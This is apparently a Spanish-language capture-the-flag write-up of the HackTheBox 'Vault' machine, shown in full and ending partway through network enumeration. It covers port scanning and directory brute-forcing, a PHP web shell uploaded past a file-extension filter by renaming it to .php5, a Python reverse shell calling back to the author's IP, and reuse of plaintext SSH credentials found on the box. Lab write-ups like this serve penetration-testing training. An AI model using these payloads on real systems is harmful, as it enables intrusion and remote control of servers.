---
title: "HTB write-up: Vault"
date: 2019-04-06T08:41:14-06:00
description: "Vault es una maquina de HTB donde usar tuneles es obligatorio. Una maquina muy divertida que nos demuestra que aunque tengamos reglas especificas de firewall, siempre hay puntos de información que revelan lo posible."
tags: ["hackthebox", "htb", "boot2root", "pentesting", "kvm", "tunneling", "proxy"]
categories: ["htb", "pentesting"]

---

Sin duda me gusto mucho esta maquina. Bypass de filtros por nombre, VPN sobre SSH, proxychains y muchos túneles mágicos.
<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![vault image](https://www.hackthebox.eu/storage/avatars/d418d8d675d22e951160a5edabf926d7_thumb.png) [vault](https://www.hackthebox.eu/home/machines/profile/161) | [nol0gz](https://www.hackthebox.eu/home/users/profile/5621) | Linux | 10.10.10.109 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-vault/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

```text
root@laptop:~# nmap -sS -p- -n --open -v 10.10.10.109
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-26 23:29 CST
Initiating Ping Scan at 23:29
Scanning 10.10.10.109 [4 ports]
Completed Ping Scan at 23:29, 0.42s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:29
Scanning 10.10.10.109 [65535 ports]
Discovered open port 22/tcp on 10.10.10.109
Discovered open port 80/tcp on 10.10.10.109
SYN Stealth Scan Timing: About 28.21% done; ETC: 23:30 (0:01:19 remaining)
SYN Stealth Scan Timing: About 38.31% done; ETC: 23:31 (0:01:38 remaining)
Completed SYN Stealth Scan at 23:31, 135.50s elapsed (65535 total ports)
Nmap scan report for 10.10.10.109
Host is up (0.21s latency).
Not shown: 56653 closed ports, 8880 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 136.10 seconds
           Raw packets sent: 121692 (5.354MB) | Rcvd: 84813 (3.393MB)
```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Doble check con `masscan`:

```text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.109
Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-27 04:25:11 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 22/tcp on 10.10.10.109
Discovered open port 80/tcp on 10.10.10.109
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):

```text
root@laptop:~# nmap -sV -sC -p80,22 -n 10.10.10.109 --script discovery
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-26 23:33 CST
Nmap scan report for 10.10.10.109
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
| ssh-hostkey:
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
| ssh2-enum-algos:
|   kex_algorithms: (6)
|   server_host_key_algorithms: (5)
|   encryption_algorithms: (6)
|   mac_algorithms: (10)
|_  compression_algorithms: (2)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-chrono: Request times for /; avg: 455.26ms; min: 410.22ms; max: 522.30ms
| http-headers:
|   Date: Wed, 27 Feb 2019 05:34:13 GMT
|   Server: Apache/2.4.18 (Ubuntu)
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|
|_  (Request type: HEAD)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 338.50 seconds
```

- `-sC` para que ejecute los scripts safe-discovery de nse
- `-sV` para que me traiga el banner del puerto
- `-p80,22` para unicamente los puertos TCP/22 y TCP/80
- `-n` para no ejecutar resoluciones
- `--script discovery` para ejecutar los NSE clasificados en discovery (and not safe, que es el por defecto)

Como podemos ver tenemos un Servidor apache 2.4.18 y un servidor openssh 7.2.p2. Continuemos por navegar por el servidor web.

# httpie to / and beyond

Veamos que tenemos en el home del servidor web:

```text
xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/index.php
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 215
Content-Type: text/html; charset=UTF-8
Date: Tue, 05 Mar 2019 06:56:43 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<b>Welcome to the Slowdaddy web interface</b>
<p>
We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.
<p>
We are proud to announce our first client: Sparklays
(Sparklays.com still under construction)
```

Nos indica que la pagina se encuentra en construcción, que se trata de una empresa que atiende al sector financiero y que su primer cliente es `sparklays`.


Lo primero que intente fue cambiar el header para buscar la pagina en construcción, pero no tuve éxito:

```text
xbytemx@laptop:~/htb/vault$ http 10.10.10.109 Host:sparklays.com
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 215
Content-Type: text/html; charset=UTF-8
Date: Tue, 05 Mar 2019 06:58:57 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<b>Welcome to the Slowdaddy web interface</b>
<p>
We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.
<p>
We are proud to announce our first client: Sparklays
(Sparklays.com still under construction)
```

Continué lanzando un `dirb` sobre home, pero no encontró resultados.

```text
xbytemx@laptop:~/htb/vault$ dirb http://10.10.10.109/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Mar  6 08:58:33 2019
URL_BASE: http://10.10.10.109/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.109/ ----
+ http://10.10.10.109/index.php (CODE:200|SIZE:299)
+ http://10.10.10.109/server-status (CODE:403|SIZE:300)

-----------------
END_TIME: Sun Mar  6 09:22:23 2019
DOWNLOADED: 4612 - FOUND: 2
```

Apunte a la carpeta con el nombre del sitio y bang, un 301 y un 403 respectivamente:

```html
xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/sparklays
HTTP/1.1 301 Moved Permanently
Connection: Keep-Alive
Content-Length: 316
Content-Type: text/html; charset=iso-8859-1
Date: Tue, 05 Mar 2019 07:01:37 GMT
Keep-Alive: timeout=5, max=100
Location: http://10.10.10.109/sparklays/
Server: Apache/2.4.18 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.10.109/sparklays/">here</a>.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.109 Port 80</address>
</body></html>

xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/sparklays/
HTTP/1.1 403 Forbidden
Connection: Keep-Alive
Content-Length: 297
Content-Type: text/html; charset=iso-8859-1
Date: Tue, 05 Mar 2019 07:01:45 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /sparklays/
on this server.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.109 Port 80</address>
</body></html>
```

Lance un `gobuster` sobre este directorio:

```text
xbytemx@laptop:~/htb/vault$ ~/tools/gobuster -t 20 -x html,php,txt -u http://10.10.10.109/sparklays/ -w ~/git/SecLists/Discovery/Web-Content/common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/sparklays/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : html,php,txt
[+] Timeout      : 10s
=====================================================
2019/03/05 00:56:57 Starting gobuster
=====================================================
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.hta.html (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/admin.php (Status: 200)
/admin.php (Status: 200)
/design (Status: 301)
/login.php (Status: 200)
=====================================================
2019/03/05 01:00:23 Finished
=====================================================
```

-  `-t 20` para indicar cuantos hilos o procesos en paralelo pueden funcionar (20 para no matarme en mi vpn)
-  `-x html,php,txt` para indicar las extensiones de los archivos que también me gustaría validar mientras se buscan carpetas
-  `-u http://10.10.10.109/sparklays/` para agregar la opción obligatoria que señala la url que recibirá los request
-  `-w ~/git/SecLists/Discovery/Web-Content/common.txt` para agregar la opción obligatoria que indica las palabras a probar

Encontramos una carpeta y 2 archivos: _design_, _admin.php_ y _login.php_

Iniciemos validando _admin.php_:

```HTML
xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/sparklays/admin.php
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 312
Content-Type: text/html; charset=UTF-8
Date: Tue, 05 Mar 2019 15:31:54 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<div class="container">
<form action ="admin.php" method="GET">
        <h2 class="form-signin-heading">Please Login</h2>
        <div class="input-group">
	  <span class="input-group-addon" id="basic-addon1">username</span>
	  <input type="text" name="username" class="form-control" placeholder="username" required>
	</div>
        <label for="inputPassword" class="sr-only">Password</label>
        <input type="password" name="password" id="inputPassword" class="form-control" placeholder="Password" required>
        <button class="btn btn-lg btn-primary btn-block" type="submit">Login</button>

      </form>

```

Parece que se trata de un form que acepta peticiones GET, probemos enviadole admin/admin:

```html
xbytemx@laptop:~/htb/vault$ http 'http://10.10.10.109/sparklays/admin.php?username=admin&password=admin'
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 312
Content-Type: text/html; charset=UTF-8
Date: Tue, 05 Mar 2019 15:36:40 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<div class="container">
<form action ="admin.php" method="GET">
        <h2 class="form-signin-heading">Please Login</h2>
        <div class="input-group">
	  <span class="input-group-addon" id="basic-addon1">username</span>
	  <input type="text" name="username" class="form-control" placeholder="username" required>
	</div>
        <label for="inputPassword" class="sr-only">Password</label>
        <input type="password" name="password" id="inputPassword" class="form-control" placeholder="Password" required>
        <button class="btn btn-lg btn-primary btn-block" type="submit">Login</button>

      </form>

```
Como podemos ver no pasa nada. De hecho si prestamos atención al botón, veremos que tampoco realiza alguna acción, por lo que marcare esto como **trampa** y continuare mi camino.

El siguiente archivo es _login.php_:

```text
xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/sparklays/login.php
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Length: 16
Content-Type: text/html; charset=UTF-8
Date: Tue, 05 Mar 2019 15:39:32 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)

access denied
```

Directo y sin mas nos da un "access denied". Como no conocemos o tenemos indicios de algún argumento, marcare esto como **sin información** y continuaré a siguiente, que es design.

En design hacemos las pruebas habituales y vemos un resultado muy parecido a sparklays:

```html
xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/sparklays/design
HTTP/1.1 301 Moved Permanently
Connection: Keep-Alive
Content-Length: 323
Content-Type: text/html; charset=iso-8859-1
Date: Sat, 06 Apr 2019 15:41:56 GMT
Keep-Alive: timeout=5, max=100
Location: http://10.10.10.109/sparklays/design/
Server: Apache/2.4.18 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.10.109/sparklays/design/">here</a>.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.109 Port 80</address>
</body></html>

xbytemx@laptop:~/htb/vault$ http http://10.10.10.109/sparklays/design/
HTTP/1.1 403 Forbidden
Connection: Keep-Alive
Content-Length: 304
Content-Type: text/html; charset=iso-8859-1
Date: Sat, 06 Apr 2019 15:42:00 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /sparklays/design/
on this server.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.109 Port 80</address>
</body></html>
```

Usando `gobuster` sobre este directorio:

```text
xbytemx@laptop:~/htb/vault$ ~/tools/gobuster -t 20 -x html,php,txt -u http://10.10.10.109/sparklays/design/ -w ~/git/SecLists/Discovery/Web-Content/common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/sparklays/design/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : html,php,txt
[+] Timeout      : 10s
=====================================================
2019/03/05 01:01:25 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.hta (Status: 403)
/.hta.html (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/design.html (Status: 200)
/uploads (Status: 301)
=====================================================
2019/03/05 01:04:54 Finished
=====================================================
```

_Las opciones se explican mas arriba_

Como podemos ver, hemos encontrado un archivo y un directorio; _uploads_ y _design.html_.

Comenzando ahora en su lugar por el directorio _uploads_ y lanzando directamente un `gobuster`:

```text
xbytemx@laptop:~/htb/vault$ ~/tools/gobuster -t 20 -x html,php,txt -u http://10.10.10.109/sparklays/design/uploads/ -w ~/git/SecLists/Discovery/Web-Content/common.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/sparklays/design/uploads/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : html,php,txt
[+] Timeout      : 10s
=====================================================
2019/03/05 01:05:40 Starting gobuster
=====================================================
/.hta (Status: 403)
/.hta.html (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
=====================================================
2019/03/05 01:09:27 Finished
=====================================================
```

_Las opciones se explican mas arriba_

No encontramos nada.

Ahora si, pasemos al archivo design.html con un `httpie`:

```text
xbytemx@laptop:~/htb/vault$ http  http://10.10.10.109/sparklays/design/design.html
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 85
Content-Type: text/html
Date: Tue, 05 Mar 2019 07:10:55 GMT
ETag: "48-56ff4d0d6e180-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Sun, 01 Jul 2018 19:09:10 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<h1> Design Settings </h1>
<p>
<a href="changelogo.php">Change Logo</a>
```

Tenemos una referencia a un archivo que no encontramos por gobuster, sigamos el rastro:

```html
xbytemx@laptop:~/htb/vault$ http  http://10.10.10.109/sparklays/design/changelogo.php
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 310
Content-Type: text/html; charset=UTF-8
Date: Tue, 05 Mar 2019 07:11:07 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Upload Your File</title>
</head>

<body>
<div id="container">
        <form enctype="multipart/form-data" action="" method="post">
        <label for="file">Choose a file to upload:</label>
        <input id="file" type="file" name="file" /><br />
        <input type="submit" value="upload file" name="submit" />

        </form>
</div>
</body>
</html>
```

Tenemos un form para subir archivos, lo cual hace sentido con la carpeta _uploads_ que encontramos anteriormente.

# uploading a php shell

Subamos una pequeña shell de php:

```html
xbytemx@laptop:~/htb/vault$ printf '<?php system($_GET["cmd"]); ?>' > miaushell.php
xbytemx@laptop:~/htb/vault$ http -v -f POST http://10.10.10.109/sparklays/design/changelogo.php file@miaushell.php submit="upload file"
POST /sparklays/design/changelogo.php HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 277
Content-Type: multipart/form-data; boundary=b57e22e967ea0a137a14f5ef7de530d7
Host: 10.10.10.109
User-Agent: HTTPie/0.9.8

--b57e22e967ea0a137a14f5ef7de530d7
Content-Disposition: form-data; name="submit"

upload file
--b57e22e967ea0a137a14f5ef7de530d7
Content-Disposition: form-data; name="file"; filename="miaushell.php"

<?php system($_GET["cmd"]); ?>
--b57e22e967ea0a137a14f5ef7de530d7--

HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 330
Content-Type: text/html; charset=UTF-8
Date: Tue, 05 Mar 2019 15:51:26 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

sorry that file type is not allowed<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Upload Your File</title>
</head>

<body>
<div id="container">
	<form enctype="multipart/form-data" action="" method="post">
        <label for="file">Choose a file to upload:</label>
        <input id="file" type="file" name="file" /><br />
        <input type="submit" value="upload file" name="submit" />

	</form>
</div>
</body>
</html>
```

Tendremos un mensaje de **sorry that file type is not allowed** ):

Probablemente se trate de algún filtro, por lo que revisando la [mágica documentación](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf), podremos ver que hay otras extensiones para php, como php5:

```html
xbytemx@laptop:~/htb/vault$ printf '<?php system($_GET["cmd"]); ?>' > dgdfgdfgdfgd.php5
xbytemx@laptop:~/htb/vault$ http -v -f POST http://10.10.10.109/sparklays/design/changelogo.php file@dgdfgdfgdfgd.php5 submit="upload file"
POST /sparklays/design/changelogo.php HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 281
Content-Type: multipart/form-data; boundary=8b2205f86044aa6650434c4bcb1c853b
Host: 10.10.10.109
User-Agent: HTTPie/0.9.8

--8b2205f86044aa6650434c4bcb1c853b
Content-Disposition: form-data; name="submit"

upload file
--8b2205f86044aa6650434c4bcb1c853b
Content-Disposition: form-data; name="file"; filename="dgdfgdfgdfgd.php5"

<?php system($_GET["cmd"]); ?>
--8b2205f86044aa6650434c4bcb1c853b--

HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 334
Content-Type: text/html; charset=UTF-8
Date: Sun, 17 Mar 2019 07:41:14 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

The file was uploaded successfully<br><br><!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Upload Your File</title>
</head>

<body>
<div id="container">
	<form enctype="multipart/form-data" action="" method="post">
        <label for="file">Choose a file to upload:</label>
        <input id="file" type="file" name="file" /><br />
        <input type="submit" value="upload file" name="submit" />

	</form>
</div>
</body>
</html>
```

Ahora que hemos podido subir nuestra shell, veamos si podemos ejecutar comandos sobre ella:

```text
xbytemx@laptop:~/htb/vault$ http "http://10.10.10.109/sparklays/design/uploads/dgdfgdfgdfgd.php5?cmd=uname"
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Length: 6
Content-Type: text/html; charset=UTF-8
Date: Sun, 17 Mar 2019 07:41:31 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)

Linux

```

Excelente, ahora que podemos ejecutar comandos sobre el servidor, podemos llamar a una reverse shell para trabajar más a gusto:

# Get a reverse shell as www-data

Para ejecutar mi reverse shell, use `urlencode` para no morir con problemas de encoding durante la ejecución. También provee previamente si podía ejecutar python, con `python --version`. Con esta validación y soporte de encoding, ejecutamos el siguiente comando:

```text
xbytemx@laptop:~/htb/vault$ http "http://10.10.10.109/sparklays/design/uploads/dgdfgdfgdfgd.php5?cmd="$(urlencode "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.12.244\",3001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
```

En mi maquina, esperando por la conexión y posteriormente haciendo el upgrade de mi tty:

```text
xbytemx@laptop:~/htb/vault$ ncat -vlnp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.109.
Ncat: Connection from 10.10.10.109:41708.
/bin/sh: 0: can't access tty; job control turned off
$

$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/sparklays/design/uploads$
```

Ahora que estamos dentro, busquemos en la carpeta home por mas información sobre la maquina:

```text
www-data@ubuntu:/var/www/html/sparklays/design/uploads$ cd /home
cd /home
www-data@ubuntu:/home$ ls -lah
ls -lah
total 16K
drwxr-xr-x  4 root root 4.0K Jul 17  2018 .
drwxr-xr-x 24 root root 4.0K Jul 17  2018 ..
drwxr-xr-x 19 alex alex 4.0K Nov  4 07:18 alex
drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 dave
```

# privesc from www-data to user

Empecemos por **dave**:

```text
www-data@ubuntu:/home$ cd dave
cd dave
www-data@ubuntu:/home/dave$ ls -lahR
ls -lahR
.:
total 124K
drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 .
drwxr-xr-x  4 root root 4.0K Jul 17  2018 ..
-rw-------  1 dave dave 2.5K Sep  3  2018 .ICEauthority
-rw-------  1 dave dave  153 Sep  3  2018 .Xauthority
-rw-------  1 dave dave   38 Mar 17 00:25 .bash_history
-rw-r--r--  1 dave dave  220 Jul 17  2018 .bash_logout
-rw-r--r--  1 dave dave 3.7K Jul 17  2018 .bashrc
drwx------ 10 dave dave 4.0K Jul 24  2018 .cache
drwx------  3 dave dave 4.0K Jul 17  2018 .compiz
drwx------ 15 dave dave 4.0K Jul 24  2018 .config
-rw-r--r--  1 dave dave   25 Jul 17  2018 .dmrc
drwx------  2 dave dave 4.0K Jul 17  2018 .gconf
drwx------  3 dave dave 4.0K Sep  3  2018 .gnupg
drwx------  3 dave dave 4.0K Jul 17  2018 .local
drwxrwxr-x  2 dave dave 4.0K Jul 24  2018 .nano
-rw-r--r--  1 dave dave  655 Jul 17  2018 .profile
-rw-rw-r--  1 dave dave 1.0K Jul 24  2018 .root.txt.swp
drwx------  2 dave dave 4.0K Jul 17  2018 .ssh
-rw-------  1 dave dave  808 Sep  3  2018 .xsession-errors
-rw-------  1 dave dave 1.4K Sep  3  2018 .xsession-errors.old
drwxr-xr-x  2 dave dave 4.0K Sep  3  2018 Desktop
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 Documents
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 Downloads
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 Music
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 Pictures
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 Public
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 Templates
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 Videos
-rw-r--r--  1 dave dave 8.8K Jul 17  2018 examples.desktop
ls: cannot open directory './.cache': Permission denied
ls: cannot open directory './.compiz': Permission denied
ls: cannot open directory './.config': Permission denied
ls: cannot open directory './.gconf': Permission denied
ls: cannot open directory './.gnupg': Permission denied
ls: cannot open directory './.local': Permission denied

./.nano:
total 8.0K
drwxrwxr-x  2 dave dave 4.0K Jul 24  2018 .
drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 ..
ls: cannot open directory './.ssh': Permission denied

./Desktop:
total 20K
drwxr-xr-x  2 dave dave 4.0K Sep  3  2018 .
drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 ..
-rw-rw-r--  1 alex alex   74 Jul 17  2018 Servers
-rw-rw-r--  1 alex alex   14 Jul 17  2018 key
-rw-rw-r--  1 alex alex   20 Jul 17  2018 ssh

./Documents:
total 8.0K
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 .
drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 ..

./Downloads:
total 8.0K
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 .
drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 ..

./Music:
total 8.0K
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 .
drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 ..

./Pictures:
total 8.0K
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 .
drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 ..

./Public:
total 8.0K
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 .
drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 ..

./Templates:
total 8.0K
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 .
drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 ..

./Videos:
total 8.0K
drwxr-xr-x  2 dave dave 4.0K Jul 17  2018 .
drwxr-xr-x 18 dave dave 4.0K Sep  3  2018 ..

```

Esos archivos en Desktop se ven sospechosos, veamos que hay dentro:

```text
www-data@ubuntu:/home/dave$ more Desktop/*
more Desktop/*
::::::::::::::
Desktop/Servers
::::::::::::::
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
--More--(Next file: Desktop/key)
::::::::::::::
Desktop/key
::::::::::::::
itscominghome
--More--(Next file: Desktop/ssh)
::::::::::::::
Desktop/ssh
::::::::::::::
dave
Dav3therav3123
```

Parece que el archivo ssh tiene unas credenciales, probemos las credenciales en la maquina:

```text
xbytemx@laptop:~/htb/vault$ ssh dave@10.10.10.109
dave@10.10.10.109's password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

222 packages can be updated.
47 updates are security updates.

Last login: Sun Mar 17 01:22:21 2019 from 10.10.14.33
dave@ubuntu:~$
```

Hemos pasado de www-data a dave.

> creds: dave / Dav3therav3123


# Enumerating _ubuntu_ as dave

Ahora que hemos podido ingresar en _ubuntu_, y que los archivos encontrados nos indican la existencia de otras maquinas mediante su dirección IP (_Servers_), comencemos a enumerar para saber como llegar hasta estas. Ni dave ni alex tienen algún archivo user.txt.

Interfaces y rutas:

```text
dave@ubuntu:~$ ip a s
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:e9:d5 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.109/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:e9d5/64 scope global mngtmpaddr dynamic
       valid_lft 86235sec preferred_lft 14235sec
    inet6 fe80::250:56ff:feb9:e9d5/64 scope link
       valid_lft forever preferred_lft forever
3: virbr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
